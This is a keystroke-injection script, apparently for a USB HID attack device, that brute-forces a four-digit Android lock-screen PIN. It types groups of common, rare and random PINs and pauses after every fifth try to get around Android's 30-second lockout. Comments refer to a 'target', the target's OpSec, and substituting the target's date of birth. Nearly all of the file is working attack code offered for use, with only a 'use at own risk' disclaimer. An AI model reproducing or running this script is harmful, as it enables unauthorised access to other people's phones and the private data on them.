//Android Password Brute Force - 4 digit pin
//07 APR 2021
//Every 5th attempt the retry waits to work around the 30s timeout Android implements after 5 failed login attempts
//Uncomment bottom of script for DOB options
//Average completion time of script is 12m
//An exhaustive wordlist is not used because A) it is not assumed device has healthy battery B) time/power constraints of healthy battery
//Tested on Android 4.4
//Author: defplex.wordpress.com
//***USE AT OWN RISK***

//top 65 common pins
typingSpeed(50,100)
waitLED(ANY_OR_NONE);
moveStepped(500,0);
delay(500);
type("1234\n");
delay(500);
type("4321\n");
delay(500);
type("1111\n");
delay(500);
type("2222\n");
delay(500);
type("3333\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("4444\n");
delay(500);
type("5555\n");
delay(500);
type("6666\n");
delay(500);
type("7777\n");
delay(500);
type("8888\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("9999\n");
delay(500);
type("1212\n");
delay(500);
type("1004\n");
delay(500);
type("2000\n");
delay(500);
type("6969\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1122\n");
delay(500);
type("1313\n");
delay(500);
type("0000\n");
delay(500);
type("2001\n");
delay(500);
type("1010\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("2580\n");
delay(500);
type("1818\n");
delay(500);
type("1230\n");
delay(500);
type("1984\n");
delay(500);
type("1986\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1985\n");
delay(500);
type("1000\n");
delay(500);
type("1231\n");
delay(500);
type("1987\n");
delay(500);
type("1999\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("2468\n");
delay(500);
type("2002\n");
delay(500);
type("2323\n");
delay(500);
type("1123\n");
delay(500);
type("1233\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1357\n");
delay(500);
type("1221\n");
delay(500);
type("1324\n");
delay(500);
type("1988\n");
delay(500);
type("2112\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1004\n");
delay(500);
type("2021\n");
delay(500);
type("5150\n");
delay(500);
type("1024\n");
delay(500);
type("1112\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1004\n");
delay(500);
type("2021\n");
delay(500);
type("5150\n");
delay(500);
type("1024\n");
delay(500);
type("1112\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1224\n");
delay(500);
type("1969\n");
delay(500);
type("1225\n");
delay(500);
type("1235\n");
delay(500);
type("1982\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1001\n");
delay(500);
type("7410\n");
delay(500);
type("1020\n");
delay(500);
type("1223\n");
delay(500);
type("1029\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1515\n");
delay(500);
type("1213\n");
delay(500);
type("2345\n");
delay(500);
type("2424\n");
delay(500);
type("2525\n");
delay(500);
type("x\n");
delay(31000);

//Set dervived from the most commonly appearing digits over an average of 1000 most used pins (0123)
moveStepped(500,0);
delay(500);
type("0123\n");
delay(500);
type("1023\n");
delay(500);
type("1203\n");
delay(500);
type("3210\n");
delay(500);
type("2112\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("2121\n");
delay(500);
type("1320\n");
delay(500);
type("3110\n");
delay(500);
type("2111\n");
delay(500);
type("0321\n");
delay(500);
type("x\n");
delay(31000);

//Including the 5 least used pins to factor in target having some OpSec
moveStepped(500,0);
delay(500);
type("8068\n");
delay(500);
type("8093\n");
delay(500);
type("6835\n");
delay(500);
type("9629\n");
delay(500);
type("7637\n");
delay(500);
type("x\n");
delay(31000);

//Last ditch effort with 4 sets of randomly generated pins
moveStepped(500,0);
delay(500);
type("6364\n");
delay(500);
type("6364\n");
delay(500);
type("6260\n");
delay(500);
type("8647\n");
delay(500);
type("0420\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("8880\n");
delay(500);
type("8631\n");
delay(500);
type("1121\n");
delay(500);
type("2996\n");
delay(500);
type("6685\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("9371\n");
delay(500);
type("3417\n");
delay(500);
type("9826\n");
delay(500);
type("2621\n");
delay(500);
type("8431\n");
delay(500);
type("x\n");
delay(31000);

moveStepped(500,0);
delay(500);
type("1185\n");
delay(500);
type("2281\n");
delay(500);
type("5519\n");
delay(500);
type("8657\n");
delay(500);
type("6435\n");
delay(500);
type("x\n");
delay(31000);

//If DOB for target is known uncomment and replace xxxx with MMDD, DDMM or YYYY
//Left at end of script on purpose to keep everything in groups of 5
//moveStepped(500,0);
//delay(500);
//type("xxxx\n");
//delay(500);
//type("xxxx\n");
//delay(500);
//type("xxxx\n");
//delay(500);
//type("x\n");

